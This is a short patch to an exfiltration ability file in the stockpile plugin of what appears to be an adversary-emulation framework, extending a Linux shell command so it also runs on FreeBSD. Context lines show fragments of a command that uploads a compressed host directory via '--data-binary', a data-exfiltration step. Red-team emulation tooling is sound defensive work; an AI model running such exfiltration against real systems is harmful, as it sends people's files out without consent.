@@ -1,0 +1,18 @@
+--- plugins/stockpile/data/abilities/exfiltration/3ce95a28-25fc-4a7e-a0cd-0fdb190e2081.yml.orig	2022-09-14 02:24:22 UTC
++++ plugins/stockpile/data/abilities/exfiltration/3ce95a28-25fc-4a7e-a0cd-0fdb190e2081.yml
+@@ -43,7 +43,7 @@
+           $result = $sr.ReadToEnd();
+           $result;
+           $res.close();
+-    linux:
++    freebsd,linux:
+       sh:
+         command: |
+           LocalFile='#{host.dir.compress}';
+@@ -55,4 +55,4 @@
+               --data-binary @#{host.dir.compress}
+   requirements:
+     - plugins.stockpile.app.requirements.paw_provenance:
+-        - source: host.dir.compress
+\ No newline at end of file
++        - source: host.dir.compress
